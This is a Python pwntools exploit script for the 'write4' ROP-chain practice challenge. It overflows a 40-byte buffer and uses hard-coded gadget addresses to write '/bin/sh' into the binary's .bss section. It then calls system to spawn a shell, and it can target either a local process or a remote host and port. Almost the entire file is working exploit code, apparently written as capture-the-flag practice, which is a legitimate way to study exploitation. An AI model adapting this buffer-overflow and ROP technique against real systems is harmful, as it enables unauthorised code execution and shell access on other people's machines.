#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './write4'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# gadget
prdi  = 0x00400893        # pop rdi ; ret
m1415 = 0x00400820        # mov qword [r14], r15 ; ret
p1415 = 0x00400890        # pop r14 ; pop r15 ; ret
system = 0x00400810       # call system

# rop1
offset = 40
payload = 'A'*offset
payload += p64(p1415) + p64(elf.bss()+0x400) + '/bin/sh\0' 
payload += p64(m1415) 
payload += p64(prdi) + p64(elf.bss()+0x400)
payload += p64(system)

# debug()
sl(payload)

p.interactive()
